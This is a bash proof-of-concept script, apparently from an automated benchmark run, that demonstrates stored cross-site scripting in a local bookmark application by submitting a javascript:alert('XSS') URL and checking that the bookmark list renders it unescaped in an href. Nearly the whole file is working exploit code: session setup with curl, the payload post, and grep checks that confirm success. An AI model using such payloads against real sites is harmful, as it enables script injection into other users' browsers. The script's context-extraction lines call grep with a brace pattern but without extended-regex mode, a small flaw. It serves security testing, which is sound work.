#!/bin/bash
# POC: Demonstrates stored XSS via JavaScript protocol in bookmark URL. Initializes session, adds javascript:alert() payload, retrieves list, and verifies unescaped rendering.
# Target: ./repo
# Created: 2025-11-07T19:40:03.986Z
# Session: benchmark-XBEN-075-24-mhp935fu

# Stored XSS via JavaScript Protocol in Bookmark URL POC v3
# This script demonstrates that the bookmark application accepts and renders
# JavaScript protocol URLs without proper validation or sanitization

TARGET_URL="http://127.0.0.1:5000"
PAYLOAD="javascript:alert('XSS')"
COOKIE_JAR="/tmp/cookies_xss.txt"

echo "[*] Stored XSS via JavaScript Protocol in Bookmark URL"
echo "[*] Target: $TARGET_URL"
echo "[*] Payload: $PAYLOAD"
echo ""

# Clean up old cookies
rm -f "$COOKIE_JAR"

# Step 1: Initial request to get session established
echo "[+] Step 1: Initializing session..."
INIT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$TARGET_URL/list")
if [ $? -ne 0 ]; then
    echo "[-] Failed to initialize session"
    exit 1
fi

# Step 2: Add bookmark with JavaScript payload
echo "[+] Step 2: Creating bookmark with javascript: protocol payload..."
ADD_RESPONSE=$(curl -s -L -c "$COOKIE_JAR" -b "$COOKIE_JAR" -d "name=XSSTest&url=$PAYLOAD" "$TARGET_URL/add")

if [ $? -eq 0 ]; then
    echo "[+] Bookmark creation request successful"
else
    echo "[-] Failed to create bookmark"
    rm -f "$COOKIE_JAR"
    exit 1
fi

# Step 3: Wait a moment for session to be updated
sleep 1

# Step 4: Retrieve the bookmark list and check if XSS payload is present
echo "[+] Step 3: Retrieving bookmark list to verify XSS payload..."
LIST_RESPONSE=$(curl -s -b "$COOKIE_JAR" "$TARGET_URL/list")

if [ $? -eq 0 ]; then
    echo "[+] Bookmark list retrieved successfully"
else
    echo "[-] Failed to retrieve bookmark list"
    rm -f "$COOKIE_JAR"
    exit 1
fi

# Step 4: Analyze response for XSS vulnerability
echo "[+] Step 4: Analyzing response for XSS vulnerability..."
echo ""

# Save response to temp file for analysis
TEMP_RESPONSE="/tmp/xss_response.html"
echo "$LIST_RESPONSE" > "$TEMP_RESPONSE"

# Check for the unescaped javascript: protocol in href attribute
if grep -q 'href="javascript:' "$TEMP_RESPONSE" || grep -q "href='javascript:" "$TEMP_RESPONSE"; then
    echo "[+] VULNERABILITY CONFIRMED!"
    echo "[+] Found unescaped javascript: protocol in href attribute"
    echo ""
    
    # Extract and display the vulnerable link
    VULN_LINK=$(grep -o 'href="javascript:[^"]*"' "$TEMP_RESPONSE" | head -1)
    if [ -z "$VULN_LINK" ]; then
        VULN_LINK=$(grep -o "href='javascript:[^']*'" "$TEMP_RESPONSE" | head -1)
    fi
    
    if [ ! -z "$VULN_LINK" ]; then
        echo "[+] Vulnerable HTML attribute found:"
        echo "    $VULN_LINK"
    fi
    echo ""
    
    # Check for XSS payload text
    if grep -q 'javascript:alert' "$TEMP_RESPONSE"; then
        echo "[+] XSS payload 'alert' function call found"
    fi
    
    echo "[+] VULNERABILITY DETAILS:"
    echo "    - JavaScript protocol is NOT validated or rejected"
    echo "    - URL is rendered directly in href attribute"
    echo "    - Stored XSS affects all users viewing bookmarks"
    echo "    - Attacker can execute arbitrary code in user's browser"
    echo "    - Clicking the bookmark link will execute: $PAYLOAD"
    echo ""
    echo "[+] POC SUCCESSFUL - Stored XSS vulnerability confirmed"
    
    # Cleanup
    rm -f "$COOKIE_JAR" "$TEMP_RESPONSE"
    exit 0
    
elif grep -qi 'javascript:alert' "$TEMP_RESPONSE"; then
    echo "[+] VULNERABILITY CONFIRMED!"
    echo "[+] Found javascript:alert in response content"
    echo ""
    
    # Extract context
    CONTEXT=$(grep -o '.{0,50}javascript:alert.{0,50}' "$TEMP_RESPONSE" | head -1)
    echo "[+] Vulnerable content context:"
    echo "    $CONTEXT"
    echo ""
    
    echo "[+] VULNERABILITY DETAILS:"
    echo "    - JavaScript protocol is NOT validated or rejected"
    echo "    - Stored XSS affects all users viewing bookmarks"
    echo "    - Attacker can execute arbitrary code in user's browser"
    echo ""
    echo "[+] POC SUCCESSFUL - Stored XSS vulnerability confirmed"
    
    # Cleanup
    rm -f "$COOKIE_JAR" "$TEMP_RESPONSE"
    exit 0

else
    echo "[-] Could not find javascript: protocol in response"
    echo ""
    
    # Debug info
    echo "[DEBUG] Checking for 'XSSTest' bookmark name..."
    if grep -q 'XSSTest' "$TEMP_RESPONSE"; then
        echo "[DEBUG] Bookmark 'XSSTest' found in response"
        
        # Show the context around the bookmark
        echo "[DEBUG] Content around XSSTest:"
        grep -o '.{0,100}XSSTest.{0,100}' "$TEMP_RESPONSE" | head -3
    else
        echo "[DEBUG] Bookmark 'XSSTest' NOT found - bookmark may not have been saved"
        
        # Check if we have any list items
        if grep -q '<li' "$TEMP_RESPONSE"; then
            echo "[DEBUG] Found list items in response"
            grep '<li' "$TEMP_RESPONSE" | head -5
        else
            echo "[DEBUG] No list items found"
        fi
    fi
    
    echo ""
    echo "[DEBUG] Response length: $(cat $TEMP_RESPONSE | wc -c) bytes"
    echo "[DEBUG] First 80 lines of response:"
    head -80 "$TEMP_RESPONSE"
    
    rm -f "$COOKIE_JAR" "$TEMP_RESPONSE"
    exit 1
fi